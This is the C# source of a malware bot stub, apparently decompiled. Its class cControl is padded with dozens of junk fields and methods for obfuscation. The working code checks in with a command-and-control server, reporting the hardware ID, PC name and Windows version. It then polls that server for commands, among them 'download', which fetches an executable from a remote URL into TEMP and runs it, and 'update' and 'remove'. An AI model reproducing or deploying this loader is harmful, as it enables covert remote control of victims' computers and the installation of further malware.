using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace Stub;

internal class cControl
{
	public bool fsdgsdfsdasdffgssdfgdfdfs = true;

	public bool fsdgsasdasdfdfsdfsdfgsdfdfs = true;

	public bool fsdgsdfaasdf43asdfsasdfsdfgsdfdfs = true;

	public bool fsdgsdasasdfwerdffsdfgsdfdfs = true;

	public bool fsdgasdfsdasf43dfsdfgsdfdfs = true;

	public bool fsdgasdfhdgs342dfsdfgsdfdfs = true;

	public bool fsdgasdfdgjs234dfsdfgsdfdfs = true;

	public bool fsdgasdfsdf23sddfdfgsdfdfs = true;

	public bool fsdgasdf2345sdfssdfdfgsdfdfs = true;

	public bool fsdasdfsd6sdffsdfgsdfdfs = true;

	public bool fsdaasdgsdf34sdfsdfgsdfdfs = true;

	public bool fsdgasdfsdf34fhsdfgsdfdfs = true;

	public bool fsdgasdfs346dfsssfgdfgsdfdfs = true;

	public bool fsdgasdfsd354fsdfgsdfgsdfdfs = true;

	public bool fsdgasdfsd56fsdfgsdfgsdfdfs = true;

	public bool fsdgasdfsd567ffgsdfgsdfdfs = true;

	public int sdfggsdfgs4sdfdf = 1;

	public int sdfggsdfsd4fgssdfdf = 1;

	public int sdfggsdsdf4fgssdfdf = 1;

	public int sdfggasdsd4fgssdfdf = 1;

	public int sdfggshdfg4ssdfdf = 1;

	public int sdfggsdfgs4dfasdssdfdf = 1;

	public int sdfgasdasd4ggsdfgssdfdf = 1;

	public int sdfggsdfhd4fsdfgssdfdf = 1;

	public int sdfggsasds4gjfdfgssdfdf = 1;

	public int sdfggghlsd4fgssdfdf = 1;

	public int sdfggsghdf4gssdfdf = 1;

	public int sdfgfjfgsd4fgssdfdf = 1;

	public int sdfgdghjgs4dfgssdfdf = 1;

	public int sdfggbzxcv4bsdfgssdfdf = 1;

	public int sdfggxcvgs4dfdfsdfgsdfgssdfdf = 1;

	public int sdfggjdfjd4fgsdgsdfgssdfdf = 1;

	public int sdfgxcvbxv4gsdfgssdfdf = 1;

	public int sdfggsxcvb4nxgsgjdfgssdfdf = 1;

	public int sdfzxcfgas4dghggsdfgssdfdf = 1;

	public int sdfgassdgv4sdghsgsdfgssdfdf = 1;

	public int sdfggsfgjh4dfgsdfgssdfdf = 1;

	public int sdfggsdadf4sdfbcfgssdfdf = 1;

	public int sdfdfshshd4fggsdfgssdfdf = 1;

	public int sdfggsfhsg4dfdfgssdfdf = 1;

	public int fhsfhdfdsf4hsdfhsdfsdfsdfhdfh = 1;

	public int sdfggssdhh4dfgssdfdf = 1;

	public int sdfggsdfgs4sdsdfgdfgsdfdf = 1;

	public int sdfggsdfdf4hfdghdfsgssdfdf = 1;

	public int sdfggasdff4gasdgsdfgssdfdf = 1;

	public int sdfggsddfj4dfjghfxgssdfdf = 1;

	public bool fsdgsdfsd4fgssdfgdfdfs = true;

	public bool fsdgsasdf4dfsdfsdfgsdfdfs = true;

	public bool fsdgsdfa443asdfsasdfsdfgsdfdfs = true;

	public bool fsdgsdasw4erdffsdfgsdfdfs = true;

	public bool fsdgsdasf443dfsdfgsdfdfs = true;

	public bool fsdghdgs3442dfsdfgsdfdfs = true;

	public bool fsdgdgjs2434dfsdfgsdfdfs = true;

	public bool fsdgsdf23s4ddfdfgsdfdfs = true;

	public bool fsdg2345sd4fssdfdfgsdfdfs = true;

	public bool fsdgsd6sdff4sdfgsdfdfs = true;

	public bool fsdgsdf34sdf4sdfgsdfdfs = true;

	public bool fsdgsdf34fhsd4fgsdfdfs = true;

	public bool fsdgs346dfsssf4gdfgsdfdfs = true;

	public bool fsdgsd354fsdfgs4dfgsdfdfs = true;

	public bool fsdgsd56fsdfgsdf4gsdfdfs = true;

	public bool fsdgsd567ffgsdfgs4dfdfs = true;

	private string sOldCommand = string.Empty;

	private void sdfgssdfgsdfgsdfdgsdfgassdfgsdfgdfsdfgsdfgsdfdf()
	{
		sdfggghlsd4fgssdfdf = 10;
	}

	private void sdfgssdfgsdfgdgssdfgasdfdfgsdfsadfgsdfgsdfdf()
	{
		sdfgxcvbxv4gsdfgssdfdf = 30;
	}

	private void sdfgsdgsdgsdfwfhdxcergdfsdfgsdfgsdfgsdfdf()
	{
		sdfggsdfsd4fgssdfdf = 345;
	}

	private void sdfgsd34dfgsszxcsdsaASdfgsdfdfgsdfgsdfgsdfdf()
	{
		sdfggsdfsd4fgssdfdf = 122;
	}

	private void sdfgsdgsdfgsadAdfgsdfgsdfdf()
	{
		fhsfhdfdsf4hsdfhsdfsdfsdfhdfh = 34534;
	}

	public void ConnectControl()
	{
		registerCCServer();
		Thread thread = new Thread(getCCServerCommand);
		thread.Start();
	}

	private void sdfgsd34dZSDFSADfgsszxcsdsaASdfgsdfdfgsdfgsdfgsdfdf()
	{
		sdfggghlsd4fgssdfdf = 122;
	}

	private void sdfgsdgsdfFSDZgsadAdfgsdfgsdfdf()
	{
		sdfggshdfg4ssdfdf = 34534;
	}

	private void registerCCServer()
	{
		string parameters = "mode=0&hwid=" + cMain.ConfigClass.sHWID + "&botver=" + cMain.ConfigClass.sBotVersion + "&pcname=" + cMain.ConfigClass.sPCName + "&winver=" + cMain.ConfigClass.sWinVersion;
		while (true)
		{
			try
			{
				string text = HTTPRequest(cMain.ConfigClass.sCServerAddress, parameters);
				if (text.Length > 0)
				{
					if (text == cMain.ConfigClass.sAuthCode)
					{
						break;
					}
					Environment.Exit(-1);
				}
			}
			catch
			{
			}
			Thread.Sleep(cMain.ConfigClass.iConnectionInterval * 60 * 1000);
		}
	}

	private void getCCServerCommand()
	{
		string parameters = "mode=1&hwid=" + cMain.ConfigClass.sHWID;
		while (true)
		{
			try
			{
				string text = HTTPRequest(cMain.ConfigClass.sCServerAddress, parameters);
				if (text.Length > 0)
				{
					if (text != sOldCommand)
					{
						handleCommand(text);
						sOldCommand = text;
					}
				}
				else
				{
					sOldCommand = string.Empty;
				}
			}
			catch
			{
			}
			Thread.Sleep(cMain.ConfigClass.iConnectionInterval * 60 * 1000);
		}
	}

	private string HTTPRequest(string URI, string Parameters)
	{
		ServicePointManager.Expect100Continue = false;
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(URI);
		httpWebRequest.ContentType = "application/x-www-form-urlencoded";
		httpWebRequest.Method = "POST";
		httpWebRequest.UserAgent = cMain.ConfigClass.sAuthCode;
		byte[] bytes = Encoding.ASCII.GetBytes(Parameters);
		httpWebRequest.ContentLength = bytes.Length;
		Stream requestStream = httpWebRequest.GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		requestStream.Close();
		WebResponse response = httpWebRequest.GetResponse();
		if (response == null)
		{
			return string.Empty;
		}
		StreamReader streamReader = new StreamReader(response.GetResponseStream());
		return streamReader.ReadToEnd().Trim();
	}

	private void handleCommand(string sCommand)
	{
		string[] array = new string[0];
		try
		{
			array = sCommand.Split(new char[1] { '*' });
		}
		catch
		{
		}
		switch (array[0])
		{
		case "remove":
			if (array[1] == Environment.MachineName || array[1].ToUpper() == "ALL")
			{
				cMain.SystemClass.RemoveBot();
			}
			break;
		case "update":
			cMain.SystemClass.updateBot(Convert.ToString(array[1]));
			break;
		case "download":
			try
			{
				string text = cMain.FunctionClass.genString(new Random().Next(5, 12)) + ".exe";
				new WebClient().DownloadFile(Convert.ToString(array[1]), Environment.GetEnvironmentVariable("TEMP") + "\\" + text);
				Process process = new Process();
				process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + text;
				process.Start();
				break;
			}
			catch
			{
				break;
			}
		}
	}
}
